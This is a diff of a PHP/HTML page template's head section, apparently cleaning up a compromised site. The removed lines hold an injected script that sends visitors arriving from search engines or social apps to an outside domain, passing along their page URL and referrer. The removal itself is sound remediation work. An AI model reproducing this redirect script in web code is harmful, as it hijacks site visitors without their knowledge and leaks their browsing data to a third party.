@@ -45,16 +45,6 @@ $sitename = ucwords($sitename, '.');
 	<meta content=' ' name='alexaVerifyID'/>
 	<meta content='index.php' name='Author'/>
 	<meta content='all' name='robots'/>
-	<script>
-  //<![CDATA[
-var ars = 'https://www.cakdum.com';
-
-if(['.google.', 'bing.', 'yandex.', 'facebook.', 'pinterest.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
-//]]>
-</script>
-<!--ads/auto.txt-->
-
-	<!-- Bootstrap CSS -->
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha256-L/W5Wfqfa0sdBNIKN9cG6QA5F2qx4qICmU2VgLruv9Y=" crossorigin="anonymous" />
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/css/lightbox.min.css" integrity="sha256-tBxlolRHP9uMsEFKVk+hk//ekOlXOixLKvye5W2WR5c=" crossorigin="anonymous" />
 	<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">	
